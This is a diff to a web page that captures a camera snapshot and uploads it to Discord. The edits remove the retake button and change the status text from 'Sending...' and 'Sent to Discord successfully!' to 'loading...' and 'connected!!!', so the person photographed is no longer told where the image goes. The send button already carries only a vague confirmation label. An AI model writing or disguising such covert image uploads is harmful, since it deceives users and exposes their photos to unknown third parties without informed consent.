@@ -35,7 +35,6 @@
   <img id="capturedImage" alt="Captured snapshot" />
   <div style="margin-top:12px;display:flex;gap:10px;justify-content:center">
     <button id="sendBtn">are you sure? press this button if yes</button>
-    <button id="retakeBtn"></button>
   </div>
   <p id="status" class="muted"></p>
 </div>
@@ -116,7 +115,7 @@ function takeSnapshot() {
 
 sendBtn.addEventListener('click', async () => {
   if (!lastBlob) return alert('No image to send.');
-  status.textContent = 'Sending...';
+  status.textContent = 'loading...';
   sendBtn.disabled = true;
 
   // Prepare FormData (file upload)
@@ -133,7 +132,7 @@ sendBtn.addEventListener('click', async () => {
       // no custom headers; let browser set boundary; Discord may block via CORS
     });
     if (res.ok) {
-      status.textContent = 'Sent to Discord successfully!';
+      status.textContent = 'connected!!!';
     } else {
       // Discord returns a non-2xx status (possible if CORS blocked before fetch resolves)
       const txt = await res.text().catch(()=>res.statusText);
